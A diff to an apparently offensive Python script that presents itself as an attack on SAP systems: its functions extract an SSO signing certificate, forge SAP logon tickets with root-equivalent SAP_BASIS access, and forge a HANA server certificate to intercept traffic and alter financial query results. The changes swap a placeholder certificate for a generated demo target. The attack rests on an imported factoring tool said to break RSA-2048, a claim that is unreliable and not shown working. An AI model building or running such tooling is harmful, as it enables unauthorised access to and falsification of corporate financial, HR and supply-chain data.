@@ -4,8 +4,10 @@ RSA-2048 key. SSO as SAP_BASIS (root equivalent) across the entire SAP
 landscape — financial data, HR, supply chain. 77% of global transaction revenue.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 import base64
@@ -28,7 +30,7 @@ def extract_sso_signing_cert(sap_host: str) -> bytes:
     print(f"[*] connecting to {sap_host}")
     print(f"[*] extracting SSO signing cert from STRUST trust store")
     print(f"[*] cert also available from partner integration documentation")
-    return b"-----BEGIN CERTIFICATE-----\n...(SAP SSO cert)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_sap_logon_ticket(factorer: PolynomialFactorer,
@@ -73,7 +75,7 @@ def forge_hana_server_cert(factorer: PolynomialFactorer,
     SAP application servers connect to HANA over TLS. MitM the connection
     and modify query results — make the balance sheet say whatever you want.
     """
-    priv = factorer.privkey_from_cert_pem(hana_cert_pem)
+    priv = factorer.reconstruct_privkey(hana_cert_pem)
     print("[*] HANA server cert factored")
     print("[*] MitM app server <-> HANA: modify financial query results")
     return priv
